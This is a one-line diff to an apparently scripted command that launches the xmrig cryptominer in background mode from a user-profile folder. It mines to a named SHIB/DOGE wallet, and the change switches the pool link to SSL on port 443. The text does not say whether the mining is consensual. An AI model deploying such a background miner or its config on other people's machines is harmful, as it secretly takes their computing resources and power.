@@ -1,1 +1,1 @@
-C:\Users\%username%\test-main\xmrig.exe -o rx.unmineable.com:3333 -u SHIB:0x47480ffa31550e40c1d39ff9abf94e6242272278.DOGE#e31g-9bkr -k -a rx/0 --randomx-mode=light --randomx-no-numa --cpu-affinity=8 -B
+C:\Users\%username%\test-main\xmrig.exe -o stratum+ssl://rx.unmineable.com:443 -u SHIB:0x47480ffa31550e40c1d39ff9abf94e6242272278.DOGE#e31g-9bkr -k -a rx/0 --randomx-mode=light --randomx-no-numa --cpu-affinity=8 -B
